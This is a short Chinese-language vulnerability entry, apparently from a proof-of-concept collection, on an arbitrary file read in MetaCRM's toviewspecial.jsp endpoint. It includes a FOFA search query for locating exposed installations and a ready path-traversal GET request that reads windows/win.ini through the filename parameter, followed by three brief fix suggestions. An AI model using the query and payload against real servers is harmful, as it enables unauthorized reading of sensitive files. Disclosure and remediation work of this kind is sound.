# MetaCRM美特crm系统toviewspecial.jsp任意文件读取漏洞

## 漏洞信息

| 项目 | 内容 |
|------|------|
| 漏洞名称 | MetaCRM美特crm系统toviewspecial.jsp接口任意文件读取漏洞 |
| 漏洞类型 | 任意文件读取 |
| 影响组件 | toviewspecial.jsp |
| 影响版本 | MetaCRM美特crm |

## 漏洞概述

MetaCRM美特crm系统toviewspecial.jsp接口存在任意文件读取漏洞，攻击者可通过构造恶意请求读取服务器敏感文件。

## fofa查询语句

```
body="/common/scripts/basic.js" && body="www.metacrm.com.cn"
```

## 漏洞复现

### POC

```http
GET /toviewspecial.jsp?filename=../../../../../../../../../../windows/win.ini HTTP/1.1
Host: target.com
```

### 漏洞特征

- 路径：/toviewspecial.jsp
- 参数：filename
- HTTP方法：GET

## 修复建议

1. 打补丁
2. 严格限制文件路径访问
3. 增加权限控制
